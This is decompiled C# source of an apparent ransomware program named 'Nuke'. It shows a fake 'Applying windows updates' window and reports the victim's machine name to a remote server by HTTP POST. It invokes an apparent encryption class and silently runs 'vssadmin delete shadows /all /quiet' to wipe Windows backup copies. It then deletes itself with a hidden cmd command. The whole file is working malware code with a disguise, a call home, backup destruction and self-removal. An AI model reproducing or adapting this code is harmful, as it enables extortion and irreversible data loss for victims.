using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using ns0;

namespace Nuke;

public class Form1 : Form
{
	internal static List<string> list_0 = new List<string>();

	internal static bool bool_0 = true;

	internal static List<string> list_1 = new List<string>();

	internal static string string_0 = "=BvNhHSNbzgNZNK9NJk7gvlalJf7Kslj8DJnzlj8DJnzHGfKjsUDNnzub=";

	internal static string string_1 = "1NLLrung1MaXucHpAzY5KjdK4y8woodJWt";

	private IContainer icontainer_0 = null;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Console.WriteLine(string_0);
		method_0();
	}

	private void method_0()
	{
		while (true)
		{
			_ = 1;
			method_1();
		}
	}

	private void method_1()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55";
		string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\PadCrypt";
		if (Directory.Exists(path) || Directory.Exists(path2))
		{
			method_5();
			return;
		}
		Directory.CreateDirectory(path);
		method_2();
	}

	private void method_2()
	{
		try
		{
			string string_ = "machine=" + Environment.MachineName;
			method_3(string_);
			Class0 @class = new Class0();
			@class.method_3();
			Desktop.set();
			foreach (string item in list_1)
			{
				Process.Start(item);
			}
			method_4();
		}
		catch
		{
		}
		method_5();
	}

	internal string method_3(string string_2)
	{
		try
		{
			WebRequest webRequest = (HttpWebRequest)WebRequest.Create("http://yodel-safe-send.bowdenol.com/hello.php");
			byte[] bytes = Encoding.UTF8.GetBytes(string_2);
			webRequest.Method = "POST";
			webRequest.ContentType = "application/x-www-form-urlencoded";
			webRequest.ContentLength = bytes.Length;
			Stream requestStream = webRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse response = webRequest.GetResponse();
			requestStream = response.GetResponseStream();
			_ = ((HttpWebResponse)response).StatusCode;
			StreamReader streamReader = new StreamReader(requestStream);
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			requestStream.Close();
			response.Close();
			return result;
		}
		catch
		{
			return string.Empty;
		}
	}

	private void method_4()
	{
		string arguments = "/C vssadmin delete shadows /all /quiet";
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.Arguments = arguments;
			process.StartInfo = processStartInfo;
			process.Start();
		}
		catch
		{
		}
	}

	private void method_5()
	{
		try
		{
			string location = Assembly.GetEntryAssembly()!.Location;
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + location + "\"");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo)!.Dispose();
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(27, 30));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(151, 15));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Applying windows updates");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(203, 78));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
